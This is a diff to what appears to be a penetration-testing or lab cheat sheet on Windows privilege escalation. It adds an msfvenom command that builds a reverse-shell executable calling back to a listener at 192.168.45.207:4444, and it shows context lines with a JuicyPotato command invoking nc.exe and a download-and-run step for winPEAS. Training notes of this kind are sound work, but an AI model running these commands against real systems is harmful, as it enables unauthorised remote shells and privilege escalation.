@@ -89,6 +89,14 @@ juicypotato32.exe -l 1360 -p c:\windows\system32\cmd.exe -a "/c c:\Temp\nc.exe -
 
 ### 9. Exploitation & Enumeration Tools
 
+reverse shell ->
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LPORT=4444 LHOST=192.168.45.207 -f exe -o shell.exe
+```
+
+winpeas ->
+
 ```powershell
 wget https://github.com/peass-ng/PEASS-ng/releases/download/20250301-c97fb02a/winPEASany.exe -OutFile winPEASany.exe
 .\winPEASany.exe  # Run WinPEAS
